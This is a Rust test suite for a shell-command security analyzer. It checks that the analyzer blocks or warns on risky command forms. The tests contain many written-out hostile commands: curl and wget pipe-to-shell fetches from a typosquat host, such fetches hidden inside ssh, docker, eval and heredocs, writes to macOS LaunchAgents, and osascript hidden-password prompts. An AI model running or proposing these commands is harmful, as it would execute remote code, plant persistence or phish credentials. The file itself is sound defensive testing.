//! One test per row of the coverage table: the command forms the rules recognise beyond a plain
//! `curl | sh`. Every command here is an inert string run through the real parser.

use super::*;

fn verdicts(command: &str, macos: bool) -> Vec<(String, Severity)> {
    analyze(command, macos)
        .into_iter()
        .map(|f| (f.rule_id, f.severity))
        .collect()
}

fn has(command: &str, macos: bool, rule: &str, severity: Severity) -> bool {
    verdicts(command, macos).contains(&(rule.to_string(), severity))
}

fn lookalike_blocks(command: &str) -> bool {
    has(command, false, LOOKALIKE, Severity::Block)
}

fn assert_all(commands: &[&str], check: impl Fn(&str) -> bool) {
    let failed: Vec<&&str> = commands.iter().filter(|cmd| !check(cmd)).collect();
    assert!(failed.is_empty(), "{failed:#?}");
}

fn clean(command: &str, macos: bool) -> bool {
    verdicts(command, macos).is_empty()
}

const BAD: &str = "https://githuh.com/x";

#[test]
fn a_lookalike_fetch_inside_another_program_blocks() {
    assert_all(
        &[
            "ssh host 'curl https://githuh.com/x | sh'",
            "ssh -p 2222 -i key user@host 'curl https://githuh.com/x | sh'",
            "docker run --rm -e A=1 alpine sh -c 'curl https://githuh.com/x | sh'",
            "docker exec -i c bash -c 'curl https://githuh.com/x | sh'",
            "kubectl exec p -- sh -c 'curl https://githuh.com/x | sh'",
            "podman run -v /a:/b img sh -c 'curl https://githuh.com/x | sh'",
            "python3 -c \"import os; os.system('curl https://githuh.com/x | sh')\"",
            "perl -e 'system(\"curl https://githuh.com/x | sh\")'",
            "ruby -e 'system(\"curl https://githuh.com/x | sh\")'",
            "node -e 'require(\"child_process\").execSync(\"curl https://githuh.com/x | sh\")'",
            "php -r 'system(\"curl https://githuh.com/x | sh\");'",
            "lua -e 'os.execute(\"curl https://githuh.com/x | sh\")'",
            "awk 'BEGIN{system(\"curl https://githuh.com/x | sh\")}'",
            "osascript -e 'do shell script \"curl https://githuh.com/x | sh\"'",
            "python3 <<EOF\nimport os\nos.system('curl https://githuh.com/x | sh')\nEOF",
            "sh <<EOF\ncurl https://githuh.com/x | sh\nEOF",
            "sh -s <<'EOF'\ncurl https://githuh.com/x | sh\nEOF",
            "ssh host <<EOF\ncurl https://githuh.com/x | sh\nEOF",
            "cat <<EOF | sh\ncurl https://githuh.com/x | sh\nEOF",
            "cat <<'EOF' | sudo bash\ncurl https://githuh.com/x | sh\nEOF",
            "echo 'curl https://githuh.com/x | sh' | sh",
            "printf '%s' 'curl https://githuh.com/x | sh' | bash",
            "sh -c -- 'curl https://githuh.com/x | sh'",
            "bash -lc -- 'curl https://githuh.com/x | sh'",
            "su -c 'curl https://githuh.com/x | sh'",
            "su --command 'curl https://githuh.com/x | sh' root",
            "pkexec sh -c 'curl https://githuh.com/x | sh'",
            "chroot /r sh -c 'curl https://githuh.com/x | sh'",
            "find . -exec sh -c 'curl https://githuh.com/x | sh' \\;",
            "find . -name a -execdir bash -c 'curl https://githuh.com/x | sh' {} +",
            "watch 'curl https://githuh.com/x | sh'",
            "watch -n 5 curl https://githuh.com/x '|' sh",
            "docker exec c sh -c 'curl https://githuh.com/x | sh'",
        ],
        lookalike_blocks,
    );
}

#[test]
fn every_fetcher_into_a_shell_is_judged_like_curl() {
    for fetcher in ["http", "https", "aria2c", "fetch", "lwp-download"] {
        assert!(
            lookalike_blocks(&format!("{fetcher} {BAD} | sh")),
            "{fetcher}"
        );
        let trusted = verdicts(&format!("{fetcher} https://brew.sh/x | sh"), false);
        assert_eq!(
            trusted,
            [(PIPE_TO_SHELL.to_string(), Severity::Warn)],
            "{fetcher}"
        );
    }
    assert_eq!(
        verdicts("curl https://brew.sh/x | sh", false),
        [(PIPE_TO_SHELL.to_string(), Severity::Warn)]
    );
}

#[test]
fn each_new_reader_runs_what_is_piped_into_it() {
    for reader in [
        "ssh host sh",
        "ssh host",
        "ssh -t host 'sh -s'",
        "su -c sh",
        "pkexec sh",
        "chroot /r sh",
        "docker run -i alpine sh",
        "kubectl exec -i p -- sh",
        "php",
        "lua -",
        "tclsh",
        "osascript",
        "awk '{ system($0) }'",
        "gawk '{ print | \"sh\" }'",
        "python3 -",
    ] {
        assert!(
            lookalike_blocks(&format!("curl {BAD} | {reader}")),
            "{reader}"
        );
    }
}

#[test]
fn things_that_only_look_like_the_new_readers_do_not() {
    assert_all(
        &[
            "curl https://githuh.com/x | ssh host ls",
            "curl https://githuh.com/x | awk '{ print $1 }'",
            "curl https://githuh.com/x | docker run alpine ls",
            "curl https://githuh.com/x | php script.php",
            "curl https://githuh.com/x | su -c ls",
        ],
        |cmd| !lookalike_blocks(cmd),
    );
}

#[test]
fn each_decoder_into_a_shell_blocks() {
    for decoder in [
        "python3 -m base64 -d",
        "python3.12 -m base64 -d",
        "basenc --base64 -d",
        "basenc -d --base64url",
        "gzip -dc",
        "gzip -d",
        "gunzip",
        "zcat",
        "xz -dc",
        "unxz",
        "xzcat",
        "bzip2 -dc",
        "bunzip2",
        "bzcat",
        "zstd -dc",
        "unzstd",
    ] {
        for reader in ["sh", "ssh host sh", "sudo bash"] {
            assert!(
                has(
                    &format!("echo x | {decoder} | {reader}"),
                    false,
                    BASE64,
                    Severity::Block
                ),
                "{decoder} | {reader}"
            );
        }
    }
}

#[test]
fn a_decoder_that_does_not_decode_or_does_not_reach_a_shell_is_clean() {
    assert_all(
        &[
            "gzip -dc a.gz > a",
            "gzip -c a > a.gz",
            "zcat a.gz | wc -l",
            "xz -z a",
            "python3 -m http.server",
            "python3 -m base64 a",
            "basenc --base64 a",
            "tar -xzf a.tgz",
        ],
        |cmd| clean(cmd, false),
    );
}

#[test]
fn a_known_variable_gives_the_same_verdict_as_the_literal() {
    assert_all(
        &[
            "U=https://githuh.com/x; curl $U | sh",
            "U=githuh.com; curl https://${U}/x | sh",
            "U=https://githuh.com/x\ncurl \"$U\" | sh",
            "export U=https://githuh.com/x; curl $U | sh",
            "local U=https://githuh.com/x; curl $U | sh",
            "readonly U=https://githuh.com/x; curl $U | sh",
            "H=githuh.com; U=https://$H/x; curl $U | sh",
            "c=curl; $c https://githuh.com/x | sh",
            "U=https://githuh.com/x; sh -c \"curl $U | sh\"",
            "U=https://githuh.com/x; eval \"curl $U | sh\"",
            "C='curl https://githuh.com/x | sh'; eval \"$C\"",
            "C='curl https://githuh.com/x | sh'; sh -c \"$C\"",
            "x=$(curl https://githuh.com/x); sh -c \"$x\"",
            "x=$(curl https://githuh.com/x); eval \"$x\"",
            "x=$(curl https://githuh.com/x); eval $x",
            "x=$(curl https://githuh.com/x); bash <<< \"$x\"",
            "x=$(curl https://githuh.com/x); echo \"$x\" | sh",
        ],
        lookalike_blocks,
    );
    assert_all(
        &[
            "x=$(echo aGk= | base64 -d); sh -c \"$x\"",
            "x=$(echo aGk= | base64 -d); eval \"$x\"",
            "y=$(echo aGk= | base64 -d); x=$y; eval \"$x\"",
        ],
        |cmd| has(cmd, false, BASE64, Severity::Block),
    );
}

#[test]
fn a_command_variable_is_analysed_once_with_the_script_it_feeds() {
    let found = verdicts("x=$(curl https://githuh.com/x); sh -c \"$x\"", false);
    let lookalikes: Vec<_> = found.iter().filter(|(id, _)| id == LOOKALIKE).collect();
    assert_eq!(lookalikes, [&(LOOKALIKE.to_string(), Severity::Block)]);
}

#[test]
fn a_command_variable_that_is_never_run_is_still_analysed() {
    assert!(has(
        "x=$(curl https://githuh.com/x); echo done",
        false,
        LOOKALIKE,
        Severity::Warn
    ));
    assert!(has(
        "x=$(curl https://githuh.com/x); echo $x",
        false,
        LOOKALIKE,
        Severity::Warn
    ));
}

#[test]
fn bindings_flow_into_the_texts_a_command_runs() {
    assert_all(
        &[
            "U=githuh.com sh -c 'curl https://$U/x | sh'",
            "U=githuh.com bash -c 'curl https://$U/x | sh'",
            "export U=githuh.com; sh -c 'curl https://$U/x | sh'",
            "U=githuh.com; eval 'curl https://$U/x | sh'",
            "U=githuh.com; ssh host 'curl https://$U/x | sh'",
            "U=githuh.com docker run alpine sh -c 'curl https://$U/x | sh'",
            "U=githuh.com; echo $(curl https://$U/x | sh)",
            "U=githuh.com; sh <<EOF\ncurl https://$U/x | sh\nEOF",
            "U=githuh.com; sh -c 'sh -c \"curl https://$U/x | sh\"'",
        ],
        lookalike_blocks,
    );
}

#[test]
fn a_prefix_assignment_binds_the_command_it_runs_not_its_own_words() {
    assert_eq!(
        verdicts("U=githuh.com curl https://$U/x | sh", false),
        [(PIPE_TO_SHELL.to_string(), Severity::Warn)]
    );
    assert_eq!(
        verdicts("U=githuh.com echo hi; curl https://$U/x | sh", false),
        [(PIPE_TO_SHELL.to_string(), Severity::Warn)]
    );
}

#[test]
fn a_value_the_text_does_not_show_is_never_guessed() {
    for cmd in [
        "curl $URL | sh",
        "curl \"$URL\" | sh",
        "read URL; curl $URL | sh",
        "U=githuh.com; read U; curl https://$U/x | sh",
        "U=githuh.com; unset U; curl https://$U/x | sh",
        "U=githuh.com; U=$(date); curl https://$U/x | sh",
        "U=githuh.com; U=a$(date); curl https://$U/x | sh",
        "U=githuh.com; U+=x; curl https://$U/x | sh",
        "U=githuh.com; for U in a b; do curl https://$U/x | sh; done",
        "U=${HOME}x; curl https://$U/x | sh",
        "U=$((1+1)); curl https://$U/x | sh",
    ] {
        assert_eq!(
            verdicts(cmd, false),
            [(PIPE_TO_SHELL.to_string(), Severity::Warn)],
            "{cmd}"
        );
    }
}

#[test]
fn a_file_written_by_a_fetch_and_then_run_blocks_like_a_pipe() {
    assert_all(
        &[
            "curl https://githuh.com/x > /tmp/a; sh /tmp/a",
            "curl https://githuh.com/x > /tmp/a && bash /tmp/a",
            "curl -o /tmp/a https://githuh.com/x && chmod +x /tmp/a && /tmp/a",
            "curl --output a https://githuh.com/x; chmod +x a; ./a",
            "wget -O /tmp/a https://githuh.com/x; sh /tmp/a",
            "wget --output-document=/tmp/a https://githuh.com/x; source /tmp/a",
            "curl https://githuh.com/x > a; . ./a",
            "cd /tmp && curl https://githuh.com/x > a && sh a",
            "curl https://githuh.com/x > /tmp/a; python3 /tmp/a",
            "echo 'curl https://githuh.com/x | sh' > /tmp/a; sh /tmp/a",
            "printf 'curl https://githuh.com/x | sh' > /tmp/a; bash /tmp/a",
            "cat > /tmp/a <<EOF\ncurl https://githuh.com/x | sh\nEOF\nsh /tmp/a",
        ],
        lookalike_blocks,
    );
    assert!(has(
        "curl https://githuh.com/x > /tmp/a; sh /tmp/a",
        false,
        PIPE_TO_SHELL,
        Severity::Warn
    ));
}

#[test]
fn a_written_file_that_is_not_the_one_run_stays_a_warning() {
    for cmd in [
        "curl https://githuh.com/x > /tmp/a; sh /tmp/b",
        "curl https://githuh.com/x > /tmp/a; cat /tmp/a",
        "curl https://githuh.com/x > /tmp/a; sh -c 'echo /tmp/a'",
        "echo 'curl https://githuh.com/x | sh' > /tmp/a; cat /tmp/a",
        "sh /tmp/a; curl https://githuh.com/x > /tmp/a",
    ] {
        assert!(!lookalike_blocks(cmd), "{cmd}");
    }
}

#[test]
fn a_source_of_stdin_with_a_fetched_here_string_blocks() {
    assert_all(
        &[
            "source /dev/stdin <<< \"$(curl https://githuh.com/x)\"",
            ". /dev/stdin <<< \"$(curl https://githuh.com/x)\"",
            "python3 - <<< \"$(curl https://githuh.com/x)\"",
            "ssh host <<< \"$(curl https://githuh.com/x)\"",
        ],
        lookalike_blocks,
    );
}

#[test]
fn a_substitution_in_an_array_subscript_is_analysed() {
    assert_all(
        &[
            "a[$(curl https://githuh.com/x | sh)]=1",
            "a[$(curl https://githuh.com/x | sh)]=1 true",
            "a=([$(curl https://githuh.com/x | sh)]=1)",
        ],
        lookalike_blocks,
    );
}

fn launch_agent_blocks(command: &str) -> bool {
    has(command, true, LAUNCH_AGENT, Severity::Block)
}

#[test]
fn every_way_to_write_into_launch_agents_is_found() {
    assert_all(
        &[
            "cd ~/Library/LaunchAgents && echo x > a.plist",
            "cd ~/Library/LaunchAgents; cp a.plist ./",
            "cd $HOME/Library/LaunchDaemons && echo x >> ./a.plist",
            "cd /Library/LaunchDaemons\ntouch a.plist",
            "D=~/Library/LaunchAgents; cd $D && echo x > a.plist",
            "echo x >| ~/Library/LaunchAgents/a.plist",
            "ditto a.plist ~/Library/LaunchAgents/a.plist",
            "unzip -d ~/Library/LaunchAgents a.zip",
            "unzip a.zip -d ~/Library/LaunchAgents/",
            "tar -C ~/Library/LaunchAgents -xf a.tar",
            "tar -xf a.tar -C ~/Library/LaunchAgents",
            "tar xf a.tar --directory=$HOME/Library/LaunchAgents",
            "tar -xzf a.tgz -C ~/Library/LaunchDaemons",
            "tar --extract --file a.tar -C ~/Library/LaunchAgents",
            "sed -i '' s/a/b/ ~/Library/LaunchAgents/a.plist",
            "sed -i.bak s/a/b/ ~/Library/LaunchAgents/a.plist",
            "sed --in-place s/a/b/ /Library/LaunchDaemons/a.plist",
            "D=~/Library/LaunchAgents; echo x > $D/a.plist",
            "D=$HOME/Library/LaunchAgents; cp a.plist $D/",
            "export D=~/Library/LaunchAgents; echo x > ${D}/a.plist",
            "sh -c 'cd ~/Library/LaunchAgents && echo x > a.plist'",
            "D=~/Library/LaunchAgents; sh -c 'echo x > $D/a.plist'",
        ],
        launch_agent_blocks,
    );
}

#[test]
fn reading_or_working_elsewhere_is_not_a_launch_agent_write() {
    assert_all(
        &[
            "cd ~/Library/LaunchAgents && ls",
            "cd ~/Library/LaunchAgents && cat a.plist > /tmp/out",
            "cd ~/Library/LaunchAgents; cd /tmp; echo x > a.plist",
            "cd ~/Library/LaunchAgents; cd $SOMEWHERE; echo x > a.plist",
            "cd ~/Library/LaunchAgents; cd; echo x > a.plist",
            "echo x > $UNSET/a.plist",
            "D=~/Library/LaunchAgents; read D; echo x > $D/a.plist",
            "tar -C /tmp -xf x.tar",
            "tar -C ~/Library/LaunchAgents -cf out.tar .",
            "tar -cf out.tar -C ~/Library/LaunchAgents .",
            "unzip -d /tmp a.zip",
            "unzip -l a.zip",
            "sed s/a/b/ ~/Library/LaunchAgents/a.plist",
            "sed -n p ~/Library/LaunchAgents/a.plist",
            "ditto ~/Library/LaunchAgents/a.plist /tmp/a.plist",
        ],
        |cmd| clean(cmd, true),
    );
}

fn osascript_blocks(command: &str) -> bool {
    has(command, true, OSASCRIPT, Severity::Block)
}

#[test]
fn every_way_to_ask_for_a_password_with_osascript_is_found() {
    assert_all(
        &[
            "osascript -e 'display dialog \"x\" with hidden answer'",
            "osascript -e 'display dialog \"x\" with hidden   answer'",
            "osascript -e 'display dialog \"x\" with\thidden\nanswer'",
            "osascript -l JavaScript -e 'app.displayDialog(\"x\", {hiddenAnswer: true})'",
            "osascript -l JavaScript -e 'app.displayDialog(\"x\", {hiddenAnswer:true})'",
            "osascript -l JavaScript -e 'app.displayDialog(\"x\", {HiddenAnswer : true})'",
            "osascript <<EOF\ndisplay dialog \"x\" with hidden  answer\nEOF",
            "osascript <<'EOF'\ndisplay dialog \"Password\"\nEOF",
            "P='display dialog \"x\" with hidden  answer'; osascript -e \"$P\"",
        ],
        osascript_blocks,
    );
    assert_all(
        &[
            "osascript -e 'display dialog \"hello\"'",
            "osascript -l JavaScript -e 'app.displayDialog(\"x\", {hiddenAnswer: false})'",
            "osascript -e 'tell app \"Finder\" to activate'",
        ],
        |cmd| clean(cmd, true),
    );
}

#[test]
fn a_quarantine_attribute_named_by_a_variable_is_found() {
    for cmd in [
        "A=com.apple.quarantine; xattr -d $A f",
        "export A=com.apple.quarantine; xattr -w $A 0 f",
        "xattr -d com.apple.quarantine f",
    ] {
        assert!(has(cmd, false, QUARANTINE, Severity::Warn), "{cmd}");
    }
    assert!(clean("xattr -d $A f", false));
    assert!(clean("A=other; xattr -d $A f", false));
}

#[test]
fn ordinary_commands_that_look_like_the_new_forms_are_clean() {
    assert_all(
        &[
            "ssh host ls",
            "find . -name '*.rs' -exec grep -l foo {} +",
            "find . -exec sh -c 'echo $0' {} \\;",
            "watch -n 5 ls",
            "ssh -p 22 host 'ls -l /tmp'",
            "ssh host 'cd /app && git pull'",
            "ssh host sudo systemctl restart app",
            "python3 -c 'print(1)'",
            "python3 -c \"import json; print(json.dumps({1: 2}))\"",
            "node -e 'console.log(\"hello world\")'",
            "perl -e 'print \"a b\\n\"'",
            "awk '{ print $1 }' file",
            "docker run --rm -v \"$PWD:/src\" img make",
            "docker run --rm alpine ls -l",
            "docker build -t sh .",
            "kubectl exec p -- ls",
            "kubectl get pods",
            "gzip -dc a.gz > a",
            "cd ~/Library/LaunchAgents && ls",
            "tar -C /tmp -xf x.tar",
            "echo 'curl is a tool' | cat",
            "echo hello | sh",
            "x=$(date); echo $x",
            "U=brew.sh; curl https://$U/install | cat",
        ],
        |cmd| clean(cmd, true),
    );
}

#[test]
fn text_in_a_language_that_is_not_shell_is_never_reported_as_unparsable() {
    assert_all(
        &[
            "python3 -c \"print('it' + \\\"'\\\" + 's a b')\"",
            "python3 -c 'print(\"a b | ( c\")'",
            "perl -e 'print \"x (y\"'",
        ],
        |cmd| clean(cmd, false),
    );
}

#[test]
fn literals_are_followed_only_to_the_depth_limit() {
    let deep =
        "python3 -c \"os.system('sh -c \\\"python3 -c \\\\\\\"os.system(1 2)\\\\\\\"\\\"')\"";
    assert!(!verdicts(deep, false).iter().any(|(id, _)| id == UNPARSABLE));
}

fn unparsable(command: &str) -> Option<Severity> {
    verdicts(command, false)
        .into_iter()
        .find(|(id, _)| id == UNPARSABLE)
        .map(|(_, severity)| severity)
}

fn blocks_somehow(command: &str) -> bool {
    verdicts(command, false)
        .iter()
        .any(|(_, severity)| *severity == Severity::Block)
}

const CURL_SH: &str = "curl https://githuh.com/x | sh";

#[test]
fn a_parse_failure_anywhere_never_loses_a_block() {
    let comment = format!("#{}", "a".repeat(70_000));
    for suffix in [
        "\nfi",
        "\n)",
        "\necho 'oops",
        " &&",
        " ||",
        "; fi",
        "; select x in a b; do break; done",
        "; ((x<<=1))",
        "; (( x = 1 << 2 ))",
        "; for ((;;)); do break; done",
    ] {
        let command = format!("{CURL_SH}{suffix}");
        assert!(blocks_somehow(&command), "{command}");
    }
    let padded = format!("{comment}\n{CURL_SH}");
    assert!(lookalike_blocks(&padded));
    assert_eq!(unparsable(&padded), Some(Severity::Warn));
}

#[test]
fn a_bad_line_after_a_good_one_is_still_read_around() {
    for command in [
        format!("{CURL_SH}\nfi"),
        format!("{CURL_SH}\n)\n)"),
        format!("fi\n{CURL_SH}"),
        format!("echo 'oops\n{CURL_SH}"),
        format!("if true; then\n{CURL_SH}\nfi\nfi"),
        "curl https://githuh.com/x |\nsh\nfi".to_string(),
    ] {
        assert!(lookalike_blocks(&command), "{command}");
    }
}

#[test]
fn unparsable_text_without_a_download_reaching_a_reader_only_warns() {
    for command in [
        "echo hi\nfi",
        "ls | sh -n\n)",
        "curl https://brew.sh/x -o a\nfi",
        "echo 'oops",
        "a ||",
    ] {
        assert_eq!(unparsable(command), Some(Severity::Warn), "{command}");
        assert!(!blocks_somehow(command), "{command}");
    }
}

#[test]
fn input_made_to_stall_the_parser_is_refused_as_a_block() {
    let cases = [
        format!("{}:;;{}", "case a in a) ".repeat(30), " esac;".repeat(30)),
        format!("{}{CURL_SH}{}", "(".repeat(20_000), ")".repeat(20_000)),
        format!("echo {}x{}", "${x:-".repeat(8_000), "}".repeat(8_000)),
        format!("{}{CURL_SH}", "(".repeat(100)),
    ];
    for command in cases {
        assert_eq!(unparsable(&command), Some(Severity::Block));
    }
}

#[test]
fn ordinary_nesting_still_parses() {
    let nested = format!("{}echo hi{}", "( ".repeat(20), " )".repeat(20));
    assert!(clean(&nested, false));
    let cases = format!("{}:;;{}", "case a in a) ".repeat(6), " esac;".repeat(6));
    assert!(clean(&cases, false));
}

#[test]
fn an_analysis_that_misses_its_deadline_is_hostile_input() {
    let (release, hold) = std::sync::mpsc::channel::<()>();
    let flat = analysis::flatten_within("echo hi", std::time::Duration::ZERO, move |_| {
        let _ = hold.recv();
        analysis::Flat::default()
    });
    assert!(matches!(flat.limits[..], [analysis::Limit::Hostile]));
    drop(release);
}

#[test]
fn an_analysis_that_answers_in_time_is_returned_whole() {
    let flat = analysis::flatten_within("echo hi", std::time::Duration::from_secs(60), |_| {
        analysis::Flat::default()
    });
    assert!(flat.limits.is_empty());
}

#[test]
fn more_script_readers_run_what_a_download_pipes_into_them() {
    assert_all(
        &[
            "curl https://githuh.com/x | osascript",
            "curl https://githuh.com/x | osascript -l JavaScript",
            "curl https://githuh.com/x | sudo -i",
            "curl https://githuh.com/x | sudo -s",
            "curl https://githuh.com/x | sudo -u root -i",
            "curl https://githuh.com/x | sudo su",
            "curl https://githuh.com/x | su",
            "curl https://githuh.com/x | su -",
            "curl https://githuh.com/x | pkexec sh",
            "curl https://githuh.com/x | python3 /dev/stdin",
            "curl https://githuh.com/x | perl /dev/stdin",
            "curl https://githuh.com/x | node /dev/stdin",
            "curl https://githuh.com/x | php",
            "curl https://githuh.com/x | mksh",
            "curl https://githuh.com/x | rbash",
            "curl https://githuh.com/x | taskset 1 sh",
            "curl https://githuh.com/x | taskset -c 0 sh",
            "curl https://githuh.com/x | strace -f sh",
            "curl https://githuh.com/x | strace -o log sh",
            "curl https://githuh.com/x | parallel sh",
            "curl https://githuh.com/x | /usr/bin/*sh",
            "curl https://githuh.com/x | {ba,}sh",
            "curl https://githuh.com/x | ?ash",
            "curl https://githuh.com/x > >(sh)",
            "f(){ sh; }; curl https://githuh.com/x | f",
            "f() { cat; }; curl https://githuh.com/x | f",
            ". /dev/stdin <<< \"$(curl https://githuh.com/x)\"",
            "sh -c -e \"$(curl https://githuh.com/x)\"",
            "bash -ec -x \"$(curl https://githuh.com/x)\"",
            "exec 3< <(curl https://githuh.com/x); sh <&3",
            "exec 3< <(curl https://githuh.com/x)\nbash <&3",
        ],
        lookalike_blocks,
    );
}

#[test]
fn things_that_only_look_like_those_readers_do_not_block() {
    assert_all(
        &[
            "curl https://githuh.com/x | sudo ls",
            "curl https://githuh.com/x | taskset -c 0 ls",
            "curl https://githuh.com/x | strace ls",
            "curl https://githuh.com/x | osascript script.scpt",
            "curl https://githuh.com/x | python3 /tmp/tool.py",
            "exec 3< <(curl https://githuh.com/x); cat <&3",
            "exec 3< <(curl https://githuh.com/x); exec 4< <(echo hi); sh <&4",
            "g() { sh; }; curl https://githuh.com/x | cat",
        ],
        |cmd| !lookalike_blocks(cmd),
    );
}

#[test]
fn what_a_feeding_stage_runs_is_judged_as_feeding() {
    assert_all(
        &[
            "echo \"$(curl https://githuh.com/x)\" | sh",
            "printf '%s\\n' \"$(curl https://githuh.com/x)\" | sh",
            "echo $(curl https://githuh.com/x) | bash",
            "bash -c 'curl https://githuh.com/x' | sh",
            "sh -c 'curl https://githuh.com/x' | sh",
            "ssh host 'curl https://githuh.com/x' | sh",
            "python3 -c \"import os; os.system('curl https://githuh.com/x')\" | sh",
            "{ echo \"$(curl https://githuh.com/x)\"; } | sh",
        ],
        lookalike_blocks,
    );
    assert_all(
        &[
            "echo \"$(curl https://githuh.com/x)\"",
            "bash -c 'curl https://githuh.com/x' | cat",
            "echo \"$(curl https://githuh.com/x)\" | wc -c",
        ],
        |cmd| !lookalike_blocks(cmd),
    );
}
